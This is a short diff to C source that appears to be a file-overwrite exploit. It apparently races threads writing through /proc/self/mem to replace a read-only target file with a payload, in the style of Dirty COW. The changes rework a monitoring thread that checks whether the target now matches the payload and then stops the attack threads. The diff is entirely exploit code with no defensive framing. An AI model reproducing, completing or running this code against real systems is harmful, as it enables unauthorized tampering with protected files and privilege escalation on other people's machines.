@@ -36,8 +36,7 @@
 		ERR_IF(_val > 0);      \
 	} while (0)
 
-#define VIRTUAL_MEMORY    "/proc/self/mem"
-#define THREAD_ITERATIONS 10000
+#define VIRTUAL_MEMORY "/proc/self/mem"
 
 char *progname = NULL;
 bool stop_thread = false;
@@ -82,7 +81,9 @@ static void *wait_for_write(void *arg) {
 	PayloadInfo *info = arg;
 	size_t len = strlen(info->payload);
 
-	while (true) {
+	while (!stop_thread) {
+		sleep(1);
+
 		char buf[len];
 		memset(buf, '\0', len);
 
@@ -93,16 +94,12 @@ static void *wait_for_write(void *arg) {
 		ERR_IF(read(fd, buf, len) < 0);
 
 		if (memcmp(buf, info->payload, len) == 0) {
-			puts("Target file is overwritten");
-			break;
+			puts("Target file is overwritten. Stopping threads.");
+			stop_thread = true;
 		}
 
 		close(fd);
-		sleep(1);
 	}
-
-	stop_thread = true;
-	puts("Stopping threads"); 
 
 	return NULL;
 }
